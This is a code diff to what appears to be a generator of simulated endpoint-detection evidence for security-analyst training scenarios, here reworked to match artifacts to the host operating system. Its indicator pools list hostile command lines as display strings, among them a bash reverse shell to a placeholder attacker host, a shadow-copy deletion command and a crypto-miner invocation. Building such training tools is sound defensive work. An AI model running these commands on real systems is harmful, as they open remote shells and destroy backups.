@@ -23,34 +23,42 @@ const USER_POOL = [
   { sam: "svc-admin", upn: "svc-admin@company.com", endpoint: "dc-01" },
 ];
 
-const MALICIOUS_FILE_POOL = [
+// Artifact pools are split per host OS so evidence never shows a Linux binary on
+// a Windows endpoint (or the reverse).
+const WINDOWS_FILE_POOL = [
   "C:\\Windows\\Temp\\svchost32.exe",
   "E:\\setup.exe",
   "C:\\Users\\USER\\AppData\\Roaming\\svchost32.exe",
-  "/tmp/.sys_cache",
-  "/usr/local/bin/xmrig",
   "C:\\Windows\\Temp\\update.exe",
   "C:\\Users\\USER\\Downloads\\free_tool.exe",
 ];
 
+const LINUX_FILE_POOL = [
+  "/tmp/.sys_cache",
+  "/usr/local/bin/xmrig",
+  "/dev/shm/.kworker",
+];
+
 const MALICIOUS_PROCESS_POOL = [
-  { name: "powershell.exe -enc SQBFAFgA...", file: null, mitre: "T1059.001" },
-  { name: "svchost32.exe -s", file: "C:\\Windows\\Temp\\svchost32.exe", mitre: "T1036" },
-  { name: "xmrig --donate-level 1", file: "/usr/local/bin/xmrig", mitre: "T1496" },
-  { name: "AnyDesk.exe", file: "C:\\Program Files\\AnyDesk\\AnyDesk.exe", mitre: "T1219" },
-  { name: "cmd.exe /c vssadmin delete shadows /all /quiet", file: null, mitre: "T1490" },
-  { name: "wmic.exe /node process call create cmd.exe", file: null, mitre: "T1047" },
-  { name: "WINWORD.EXE /macro", file: null, mitre: "T1204" },
-  { name: "bash -i >& /dev/tcp/ATTACKER/4444 0>&1", file: null, mitre: "T1059.004" },
+  { name: "powershell.exe -enc SQBFAFgA...", file: null, mitre: "T1059.001", os: "win" },
+  { name: "svchost32.exe -s", file: "C:\\Windows\\Temp\\svchost32.exe", mitre: "T1036", os: "win" },
+  { name: "xmrig --donate-level 1", file: "/usr/local/bin/xmrig", mitre: "T1496", os: "linux" },
+  { name: "kworker -c /dev/shm/.kworker", file: "/dev/shm/.kworker", mitre: "T1036", os: "linux" },
+  { name: "AnyDesk.exe", file: "C:\\Program Files\\AnyDesk\\AnyDesk.exe", mitre: "T1219", os: "win" },
+  { name: "cmd.exe /c vssadmin delete shadows /all /quiet", file: null, mitre: "T1490", os: "win" },
+  { name: "wmic.exe /node process call create cmd.exe", file: null, mitre: "T1047", os: "win" },
+  { name: "WINWORD.EXE /macro", file: null, mitre: "T1204", os: "win" },
+  { name: "bash -i >& /dev/tcp/ATTACKER/4444 0>&1", file: null, mitre: "T1059.004", os: "linux" },
 ];
 
 const PERSISTENCE_POOL = [
-  "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\svcupdate",
-  "C:\\Windows\\Temp\\svchost32.exe scheduled task",
-  "C:\\Users\\Public\\updater.bat in StartUp folder",
-  "systemd service 'update-checker' (auto-start)",
-  "HKCU\\Run\\WinUpdate (svchost32.exe auto-start)",
-  "WMI ActiveScriptEventConsumer (encoded PS payload)",
+  { artifact: "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\svcupdate", os: "win" },
+  { artifact: "C:\\Windows\\Temp\\svchost32.exe scheduled task", os: "win" },
+  { artifact: "C:\\Users\\Public\\updater.bat in StartUp folder", os: "win" },
+  { artifact: "HKCU\\Run\\WinUpdate (svchost32.exe auto-start)", os: "win" },
+  { artifact: "WMI ActiveScriptEventConsumer (encoded PS payload)", os: "win" },
+  { artifact: "systemd service 'update-checker' (auto-start)", os: "linux" },
+  { artifact: "cron entry '/dev/shm/.kworker' (every minute)", os: "linux" },
 ];
 
 // ─── Scenario Profiles ─────────────────────────────────────────────────────────
@@ -336,28 +344,41 @@ export function generateRunSeed(scenarioId) {
     ? profile.patientZero
     : pick(patientZeroPool).id;
 
+  // Host OS of patient zero drives which artifacts can plausibly appear on it
+  const patientZeroEp = ENDPOINTS.find(ep => ep.id === seed.patientZero);
+  const hostOs = /ubuntu|linux|debian|kali|centos|red hat/i.test(patientZeroEp?.os || "") ? "linux" : "win";
+  const matchOs = (item) => (typeof item === "string" ? true : item.os === hostOs);
+
   // Malicious file
   if (iocTypes.has("maliciousFile")) {
     const defaultFile = profile.defaults.maliciousFile;
-    seed.maliciousFile = pick(MALICIOUS_FILE_POOL);
+    // Resolve the USER placeholder so the file path shown in EDR is a real path
+    const ownerUser = seed.compromisedUser?.sam
+      || patientZeroEp?.user
+      || "jsmith";
+    const filePool = hostOs === "linux" ? LINUX_FILE_POOL : WINDOWS_FILE_POOL;
+    seed.maliciousFile = pick(filePool).replace("USER", ownerUser);
     if (defaultFile) {
       seed.substitutions[defaultFile] = seed.maliciousFile;
     }
   }
 
-  // Malicious processes (1-3 from pool, always include scenario-relevant ones)
+  // Malicious processes (1-2 from the OS-matching pool)
   if (iocTypes.has("maliciousProcess")) {
-    const count = 1 + Math.floor(Math.random() * 2); // 1-2 processes
-    seed.maliciousProcesses = pickN(MALICIOUS_PROCESS_POOL, count).map(p => ({
+    const count = 1 + Math.floor(Math.random() * 2);
+    seed.maliciousProcesses = pickN(MALICIOUS_PROCESS_POOL.filter(p => p.os === hostOs), count).map(p => ({
       ...p,
-      name: p.name.replace("ATTACKER", seed.attackerIP || "185.220.101.47").replace("USER", seed.compromisedUser?.sam || "jsmith"),
+      name: p.name.replace("ATTACKER", seed.attackerIP || "external-c2").replace("USER", seed.compromisedUser?.sam || "jsmith"),
       file: p.file ? p.file.replace("USER", seed.compromisedUser?.sam || "jsmith") : null,
     }));
   }
 
-  // Persistence artifacts (1-3 from pool)
+  // Persistence artifacts (1-3 from the OS-matching pool)
   if (iocTypes.has("persistence")) {
-    seed.persistenceArtifacts = pickN(PERSISTENCE_POOL, 2 + Math.floor(Math.random() * 2));
+    seed.persistenceArtifacts = pickN(
+      PERSISTENCE_POOL.filter(matchOs).map(p => p.artifact),
+      2 + Math.floor(Math.random() * 2)
+    );
   }
 
   // Threat parameters (randomized within scenario-appropriate ranges)
@@ -424,7 +445,9 @@ export function generateEDRFromSeed(scenarioId, seed) {
   // Surface dropped files and persistence artifacts in EDR, so the file and
   // persistence remediation answers are verifiable in the analyst's evidence.
   (seed.maliciousProcesses || []).forEach((proc, i) => {
-    if (!proc.file) return;
+    // Installed-program binaries are not dropped artifacts — never present them
+    // as the file to quarantine.
+    if (!proc.file || /program files/i.test(proc.file)) return;
     detections.push({
       id: `edr-file-${i}`,
       kind: "file",
@@ -490,7 +513,11 @@ export function generateEDRFromSeed(scenarioId, seed) {
         process: d.process,
         pid: 2000 + i * 137,
         parent: d.parent || "services.exe",
-        cmdline: applySubstitutions(d.cmdline, seed.substitutions),
+        // ATTACKER is the literal placeholder used by the scenario EDR templates
+        cmdline: applySubstitutions(d.cmdline, {
+          ...seed.substitutions,
+          ...(seed.attackerIP ? { ATTACKER: seed.attackerIP } : {}),
+        }),
         severity: d.severity,
         mitre: d.mitre,
         time: new Date(now - d.minsAgo * 60000).toISOString(),
